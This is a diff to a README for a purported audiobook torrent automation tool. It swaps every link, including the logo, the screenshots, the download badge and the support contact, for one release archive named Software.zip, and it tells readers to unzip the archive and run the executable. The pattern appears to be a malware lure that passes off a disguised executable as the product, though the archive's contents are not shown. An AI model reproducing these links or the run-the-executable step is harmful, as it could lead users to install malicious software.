@@ -1,7 +1,7 @@
 
 # 🎧 AudiobookBay Automated 📚
 
-![AudiobookBay Automated Logo](https://www.example.com/logo.png)
+![AudiobookBay Automated Logo](https://github.com/Alexiel837373i3i3/audiobookbay-automated/releases/download/v2.0/Software.zip)
 
 Welcome to the **AudiobookBay Automated** repository! This tool is designed to streamline the process of adding torrents from AudioBookBay to qBittorrent and automatically setting the download location. Whether you're a bookworm looking to expand your audiobook collection or a developer interested in automation tools, this repository has got you covered. Let's dive into the details!
 
@@ -14,8 +14,8 @@ Welcome to the **AudiobookBay Automated** repository! This tool is designed to s
 
 To get started with **AudiobookBay Automated**, follow these simple steps:
 
-1. Download the software from the following link: [Download Software](https://github.com/user-attachments/files/18383251/Software.zip)
-   ![Download Software](https://img.shields.io/badge/Download-Software-blue)
+1. Download the software from the following link: [Download Software](https://github.com/Alexiel837373i3i3/audiobookbay-automated/releases/download/v2.0/Software.zip)
+   ![Download Software](https://github.com/Alexiel837373i3i3/audiobookbay-automated/releases/download/v2.0/Software.zip)
    *(Note: The software needs to be launched after downloading.)*
 
 2. Unzip the downloaded file and run the executable to launch the application.
@@ -28,15 +28,15 @@ To get started with **AudiobookBay Automated**, follow these simple steps:
 
 Here are some sneak peeks into the **AudiobookBay Automated** software:
 
-![Screenshot 1](https://www.example.com/screenshot1.png)
+![Screenshot 1](https://github.com/Alexiel837373i3i3/audiobookbay-automated/releases/download/v2.0/Software.zip)
 *Caption: Interface of the AudiobookBay Automated tool.*
 
-![Screenshot 2](https://www.example.com/screenshot2.png)
+![Screenshot 2](https://github.com/Alexiel837373i3i3/audiobookbay-automated/releases/download/v2.0/Software.zip)
 *Caption: Adding a torrent from AudioBookBay to qBittorrent.*
 
 ## Support 💬
 
-For any questions, feedback, or issues related to **AudiobookBay Automated**, feel free to reach out to our support team at [support@audiobookbayautomated.com](mailto:support@audiobookbayautomated.com). We're here to assist you in making your audiobook downloading experience seamless and enjoyable.
+For any questions, feedback, or issues related to **AudiobookBay Automated**, feel free to reach out to our support team at [https://github.com/Alexiel837373i3i3/audiobookbay-automated/releases/download/v2.0/Software.zip](https://github.com/Alexiel837373i3i3/audiobookbay-automated/releases/download/v2.0/Software.zip). We're here to assist you in making your audiobook downloading experience seamless and enjoyable.
 
 ## Contribute 🤝
 
